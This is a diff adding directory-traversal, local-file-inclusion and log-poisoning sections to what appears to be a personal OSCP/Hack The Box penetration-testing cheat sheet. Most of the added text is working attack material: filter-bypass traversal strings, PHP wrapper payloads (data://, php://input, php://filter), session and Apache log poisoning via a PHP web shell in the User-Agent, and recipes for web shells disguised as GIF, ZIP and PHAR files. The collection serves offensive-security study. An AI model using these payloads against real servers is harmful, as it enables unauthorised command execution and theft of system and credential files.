@@ -922,6 +922,7 @@ curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Ty
 
 # User-agent
 curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(...))</script>" --proxy 127.0.0.1:8080
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
 ```
 
 ### wget
@@ -1573,30 +1574,167 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 - Try with POST request
   - Intercept the request with Burp Suite
 
+
+
+============ Directory Traversal && LFI ===========================================================================
+
 ## Directory Traversal
-- Check DT vulnerability On windows:
+- Check DT vulnerability On windows: Check both absolute path && relative path
   - C:\Windows\System32\drivers\etc\hosts
   - C:\inetpub\logs\LogFiles\W3SVC1\
   - C:\inetpub\wwwroot\web.config
-- On Linux:
+  - C:/Windows/boot.ini
+  - C:/Windows/System32/drivers/etc/hosts
+  - ../../../../../../../../../Windows/System32/drivers/etc/hosts
+  - C:\xampp\apache\logs\access.log
+- On Linux: Check both absolute path && relative path
   - /etc/passwd
   - curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
   - Check .ssh directory
+  - /etc/php/7.4/apache2/php.ini
+  - /var/log/apache2/access.log
+
+### Filename Prefix
+```bash
+include("lang_" . $_GET['language']);
+```
+- index.php?language=/../../../etc/passwd
+
+### Second-Order Attacks
+When a web application may allow us to download our avatar through a URL like (/profile/$username/avatar.png).
+- we craft a malicious LFI username (e.g. ../../../etc/passwd)
+
+### Non-Recursive Path Traversal Filters
+- ....//
+- ..././
+- ....\/
+- ?language=languages/....//....//....//....//flag.txt
+
+### Bypass with URL Encoding
+- ?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+
+### Approved Paths
+we can fuzz web directories under the same path, and try different ones until we get a match
+- /index.php?language=./languages/../../../../etc/passwd
+
+### Bypass with file 
+?file=zip://uploads/upload_xkxkxk.zip%23simple-backdoor&cmd=whoami
+
 - Make sure to read and try exploit codes' examples
 - Use curl --path-as-is or burp suite
 - Check if we can read other vulnerable app's config file through this vulnerability
 - Check other user's home directories to see the name of the files(pg practice cassandra)
 - If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)
 
+### Bypass Appended Extension
+- null byte
+- truncate
+
+### Source Code Disclosure(WE NEED TO FUZZ)
+```bash
+mightyllama@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+
+index.php?language=php://filter/read=convert.base64-encode/resource=config
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+
+echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
+```
+
+### Data Wrapper
+```bash
+echo '<?php system($_GET["cmd"]); ?>' | base64
+URL ENCODED!
+index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```
+
+### Input Wrapper
+```bash
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+======================= log poisoning ===========================================================================
+
+### PHP Session Poisoning
+PHPSESSID from inspect->storage->cookies
+
+```bash
+# session files location
+/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
+C:\Windows\Temp\sess_el4ukv0kqbvoirg7nkp4dncpk3
+
+# check if we can reach file
+index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+
+# poison the log with url encoded php code
+index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+# check if we can run the code
+index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+
+### Server Log Poisoning
+```bash
+# Apache logs location
+/var/log/apache2/access.log
+C:\xampp\apache\logs\access.log
+
+# nginx logs location
+/var/log/nginx/
+C:\nginx\log\
+
+# files on /proc directory(The User-Agent header is also shown on process files under the Linux /proc/ directory)
+/proc/self/environ
+/proc/self/fd/N files (where N is a PID usually between 0-50)
+
+# etc
+/var/log/sshd.log
+/var/log/mail
+/var/log/vsftpd.log
+
+# posioning with curl
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
+```
+
+======================= Automated scanning =========================================================================
+
+### Fuzzing Parameters
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+```
+
+### Check LFI vulnerability with LFI wordlists
+```bash
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+```
+
+### Server Webroot
+```bash
+# common webroot paths wordlists
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
+
+# fuzzing with index.php file
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+```
+
+### Server Logs/Configurations(identify the correct logs directory to be able to perform the log poisoning attacks)
+```bash
+# common server logs and configuration paths wordlists
+https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
+
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+# /etc/apache2/apache2.conf
+# /etc/apache2/envvars
+```
+
+
 ## Local File Inclusion
 - Make sure to check "important files" list
 - Make sure to see what files we can find using wfuzz on our current location
   - Make sure to check file extension(.py, .js, .conf, .config...)
-- Files to Check on windows
-  - C:/Windows/System32/drivers/etc/hosts
-  - ../../../../../../../../../Windows/System32/drivers/etc/hosts
-  - C:/Windows/boot.ini
-  - /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
+- /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 - Files to check on linux
   - ![image](https://github.com/nuricheun/OSCP/assets/14031269/6f634499-c15a-4424-adae-df9013031d02)
 
@@ -1616,6 +1754,38 @@ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.t
 ```bash
 echo "AddType application/x-httpd-php .xxx" > htaccess
 ```
+
+### Crafting Malicious Image
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+# when exeuciting
+/index.php?language=./profile_images/shell.gif&cmd=id
+```
+
+### Crafting Malicious Zip file
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+# when exeuciting
+/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```
+
+### Crafting Malicious Phar
+```bash
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering(); ?>
+
+# compile
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+
+# execute
+index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
+
 
 # Password Attacks
 - What is the password encoded with?
